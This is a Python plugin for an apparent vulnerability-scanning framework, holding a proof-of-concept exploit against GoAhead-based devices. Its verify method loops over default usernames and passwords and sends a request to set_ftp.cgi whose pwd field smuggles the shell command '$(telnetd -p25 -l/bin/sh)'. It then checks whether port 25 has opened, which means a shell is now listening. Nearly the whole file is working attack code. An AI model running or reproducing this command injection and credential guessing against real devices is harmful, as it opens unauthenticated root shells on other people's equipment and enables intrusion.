import socket
import requests

from loguru import logger

from .base import POCTemplate


class GoaheadRCE01(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['goahead']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.high
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
        self.users = ['admin', 'root']
        self.passwords = ['12345', '123456', 'admin', 'qwe123']

    def _check_telnet(self, ip, port=25):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.config.timeout)
        try:
            return s.connect_ex((ip, int(port))) == 0
        except Exception as e:
            logger.error(e)
            return False
        finally:
            s.close()

    def verify(self, ip, port=80):
        for user in self.users:
            for password in self.passwords:
                try:
                    path = (
                        f"/set_ftp.cgi?next_url=ftp.htm&loginuse={user}&loginpas={password}"
                        f"&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)"
                        f"&dir=/&mode=PORT&upload_interval=0"
                    )
                    url = f"http://{ip}:{port}{path}"
                    r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
                    if r.status_code == 200 and self._check_telnet(ip, 25):
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(GoaheadRCE01)
